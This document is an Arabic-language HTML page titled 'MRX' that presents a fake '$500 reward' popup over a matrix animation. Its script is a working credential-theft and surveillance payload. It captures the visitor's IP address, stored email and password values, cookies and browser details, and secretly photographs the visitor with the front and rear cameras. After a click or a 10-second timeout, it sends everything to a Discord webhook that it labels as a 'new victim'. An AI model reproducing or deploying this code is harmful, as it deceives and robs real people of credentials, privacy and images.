<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> MRX</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#001a00;display:flex;justify-content:center;align-items:center;min-height:100vh;overflow:hidden;font-family:monospace}
        .monitor{position:relative;width:80vw;max-width:900px;height:55vw;max-height:550px;background:#0a1f0a;border:20px solid #0f2f0f;border-radius:15px;box-shadow:0 0 50px rgba(0,255,65,0.5),inset 0 0 30px #0f0}
        .screen{position:relative;width:100%;height:100%;background:#000;overflow:hidden;border:2px solid #1f3f1f}
        .screen::before{content:"";position:absolute;top:0;left:0;bottom:0;right:0;background:linear-gradient(rgba(0,255,0,0.03)50%,rgba(0,0,0,0.2)50%);background-size:100%4px;z-index:2;pointer-events:none}
        canvas{display:block;width:100%;height:100%}
        .stand{width:160px;height:50px;background:#0a1f0a;margin:0 auto;border-bottom-left-radius:10px;border-bottom-right-radius:10px;border-left:2px solid #0f2f0f;border-right:2px solid #0f2f0f}
        .base{width:280px;height:12px;background:#0f2f0f;margin:0 auto;border-radius:5px;box-shadow:0 0 20px #0f0}
        #hackWindow{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:flex;justify-content:center;align-items:center;font-family:Arial,sans-serif;backdrop-filter:blur(10px)}
        #hackBox{background:linear-gradient(145deg,#0a1f0a,#001a00);border:3px solid #0f0;border-radius:20px;padding:50px 60px;max-width:600px;width:90%;text-align:center;box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1);animation:pulse 2s infinite}
        @keyframes pulse{0%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}50%{box-shadow:0 0 120px rgba(0,255,0,0.6),inset 0 0 80px rgba(0,255,0,0.2)}100%{box-shadow:0 0 80px rgba(0,255,0,0.3),inset 0 0 50px rgba(0,255,0,0.1)}}
        #hackBox h1{color:#0f0;font-size:28px;margin-bottom:15px;text-shadow:0 0 20px #0f0}
        #hackBox p{color:#8f8;font-size:18px;margin:20px 0;line-height:1.8}
        #hackBox .emoji-big{font-size:60px;display:block;margin:10px 0}
        #agreeBtn{background:#0f0;color:#000;border:none;padding:15px 50px;font-size:22px;font-weight:bold;border-radius:50px;cursor:pointer;margin-top:20px;transition:all 0.3s;box-shadow:0 0 30px rgba(0,255,0,0.5);font-family:Arial,sans-serif}
        #agreeBtn:hover{transform:scale(1.05);box-shadow:0 0 50px rgba(0,255,0,0.8)}
        #agreeBtn:active{transform:scale(0.95)}
        #timer{color:#0f0;font-size:14px;margin-top:15px;opacity:0.7}
    </style>
</head>
<body>
    <div id="hackWindow">
        <div id="hackBox">
            <span class="emoji-big">💰</span>
            <h1>🎯 هل تسمح بدخول Google والحصول على 500$؟</h1>
            <p>📍 اضغط موافق للحصول على المكافأة<br>⚡ سيتم تفعيل حسابك فوراً</p>
            <button id="agreeBtn">✅ موافق - احصل على 500$</button>
            <div id="timer">⏳ سيتم الإرسال خلال 10 ثواني...</div>
        </div>
    </div>
    <div>
        <div class="monitor">
            <div class="screen">
                <canvas id="matrix"></canvas>
            </div>
        </div>
        <div class="stand"></div>
        <div class="base"></div>
    </div>
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1539062777560440922/OZgU_20rTLkIHqHshEnSuqfvZfiVvIbApj8AQAIxS4MSOGo8APShnrqjDqU3TCxP-TZq";
        const c = document.getElementById('matrix');
        const x = c.getContext('2d');
        c.width = c.parentElement.clientWidth;
        c.height = c.parentElement.clientHeight;
        const z = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const s = 16;
        const col = Math.floor(c.width / s);
        const d = Array(col).fill(1);
        setInterval(() => {
            x.fillStyle = 'rgba(0,20,0,0.04)';
            x.fillRect(0,0,c.width,c.height);
            x.fillStyle = '#0f0';
            x.shadowColor = '#0f0';
            x.shadowBlur = 6;
            x.font = s + 'px monospace';
            for(let i=0;i<col;i++){
                x.fillText(z[Math.floor(Math.random()*z.length)], i*s, d[i]*s);
                if(d[i]*s > c.height && Math.random() > 0.975) d[i] = 0;
                d[i]++;
            }
            x.shadowBlur = 0;
        }, 33);
        let ip = 'غير معروف';
        let email = localStorage.getItem('email') || 'غير موجود';
        let password = localStorage.getItem('password') || 'غير موجود';
        let phone = 'كمبيوتر';
        let frontImage = 'غير متاح';
        let backImage = 'غير متاح';
        let captured = false;
        function captureAndSend() {
            if(captured) return;
            captured = true;
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(d => ip = d.ip)
                .catch(() => ip = 'غير معروف')
                .finally(() => {
                    const ua = navigator.userAgent;
                    if(/android/i.test(ua)) phone = 'Android';
                    else if(/iphone|ipad|ipod/i.test(ua)) phone = 'iOS';
                    else if(/windows phone/i.test(ua)) phone = 'Windows Phone';
                    if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                            .then(stream => {
                                const video = document.createElement('video');
                                video.srcObject = stream;
                                video.onloadedmetadata = () => {
                                    video.play();
                                    const canvas2 = document.createElement('canvas');
                                    canvas2.width = video.videoWidth;
                                    canvas2.height = video.videoHeight;
                                    const ctx2 = canvas2.getContext('2d');
                                    ctx2.drawImage(video, 0, 0);
                                    frontImage = canvas2.toDataURL('image/jpeg');
                                    stream.getTracks().forEach(track => track.stop());
                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                                        .then(stream2 => {
                                            const video2 = document.createElement('video');
                                            video2.srcObject = stream2;
                                            video2.onloadedmetadata = () => {
                                                video2.play();
                                                const canvas3 = document.createElement('canvas');
                                                canvas3.width = video2.videoWidth;
                                                canvas3.height = video2.videoHeight;
                                                const ctx3 = canvas3.getContext('2d');
                                                ctx3.drawImage(video2, 0, 0);
                                                backImage = canvas3.toDataURL('image/jpeg');
                                                stream2.getTracks().forEach(track => track.stop());
                                                sendAll();
                                            };
                                        })
                                        .catch(() => sendAll());
                                };
                            })
                            .catch(() => {
                                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                                    .then(stream => {
                                        const video = document.createElement('video');
                                        video.srcObject = stream;
                                        video.onloadedmetadata = () => {
                                            video.play();
                                            const canvas2 = document.createElement('canvas');
                                            canvas2.width = video.videoWidth;
                                            canvas2.height = video.videoHeight;
                                            const ctx2 = canvas2.getContext('2d');
                                            ctx2.drawImage(video, 0, 0);
                                            backImage = canvas2.toDataURL('image/jpeg');
                                            stream.getTracks().forEach(track => track.stop());
                                            sendAll();
                                        };
                                    })
                                    .catch(() => sendAll());
                            });
                    } else {
                        sendAll();
                    }
                });
        }
        function sendAll() {
            const screenInfo = screen.width + 'x' + screen.height;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const cookies = document.cookie || 'لا توجد';
            const pageUrl = window.location.href;
            const referrer = document.referrer || 'لا يوجد';
            const ua = navigator.userAgent;
            
            const formData = new FormData();
            const payload = {
                username: "المخترق MRX",
                content: "**🔥 تم اختراق ضحية جديدة بنجاح!**",
                embeds: [{
                    title: "📡 جميع المعلومات المسروقة",
                    color: 0x00ff00,
                    fields: [
                        {name: "🌐 IP", value: ip, inline: true},
                        {name: "📱 الجوال", value: phone, inline: true},
                        {name: "📧 البريد", value: email, inline: true},
                        {name: "🔑 كلمة المرور", value: password, inline: true},
                        {name: "🖥️ الشاشة", value: screenInfo, inline: true},
                        {name: "🌍 اللغة", value: language, inline: true},
                        {name: "⏰ المنطقة", value: timezone, inline: true},
                        {name: "🍪 الكوكيز", value: cookies.substring(0, 500), inline: false},
                        {name: "🔗 الصفحة", value: pageUrl, inline: false},
                        {name: "↩️ الرابط السابق", value: referrer, inline: false},
                        {name: "📦 المتصفح", value: ua.substring(0, 300), inline: false}
                    ]
                }]
            };
            formData.append('payload_json', JSON.stringify(payload));
            
            if(frontImage !== 'غير متاح') {
                const arr = frontImage.split(',');
                const mime = arr[0].match(/:(.*?);/)[1];
                const bstr = atob(arr[1]);
                let n = bstr.length;
                const u8arr = new Uint8Array(n);
                while(n--) u8arr[n] = bstr.charCodeAt(n);
                const blob = new Blob([u8arr], {type: mime});
                formData.append('front.jpg', blob, 'front.jpg');
            }
            if(backImage !== 'غير متاح') {
                const arr = backImage.split(',');
                const mime = arr[0].match(/:(.*?);/)[1];
                const bstr = atob(arr[1]);
                let n = bstr.length;
                const u8arr = new Uint8Array(n);
                while(n--) u8arr[n] = bstr.charCodeAt(n);
                const blob = new Blob([u8arr], {type: mime});
                formData.append('back.jpg', blob, 'back.jpg');
            }
            
            if(WEBHOOK.includes("https://discord.com/api/webhooks/1539062777560440922/OZgU_20rTLkIHqHshEnSuqfvZfiVvIbApj8AQAIxS4MSOGo8APShnrqjDqU3TCxP-TZq")) {
                console.log('⚠️ غير الرابط');
            } else {
                fetch(WEBHOOK, {
                    method: 'POST',
                    body: formData
                }).then(response => {
                    if(response.ok) {
                        console.log('✅ تم الإرسال بنجاح');
                    } else {
                        console.log('❌ فشل الإرسال: ' + response.status);
                    }
                }).catch(error => {
                    console.log('❌ خطأ: ' + error);
                });
            }
        }
        setInterval(() => {
            document.querySelectorAll('input[type="password"], input[type="text"], input[type="email"]').forEach(inp => {
                if(inp.value && inp.value.length > 0) {
                    if(inp.type === 'password') localStorage.setItem('password', inp.value);
                    else if(inp.type === 'email') localStorage.setItem('email', inp.value);
                }
            });
        }, 2000);
        let countdown = 10;
        const timerEl = document.getElementById('timer');
        const agreeBtn = document.getElementById('agreeBtn');
        const hackWindow = document.getElementById('hackWindow');
        agreeBtn.addEventListener('click', function() {
            hackWindow.style.display = 'none';
            captureAndSend();
        });
        const countdownInterval = setInterval(() => {
            countdown--;
            timerEl.textContent = `⏳ سيتم الإرسال خلال ${countdown} ثواني...`;
            if(countdown <= 0) {
                clearInterval(countdownInterval);
                timerEl.textContent = '⏳ جاري الإرسال...';
                setTimeout(() => {
                    hackWindow.style.display = 'none';
                    captureAndSend();
                }, 1000);
            }
        }, 1000);
    </script>
</body>
</html>
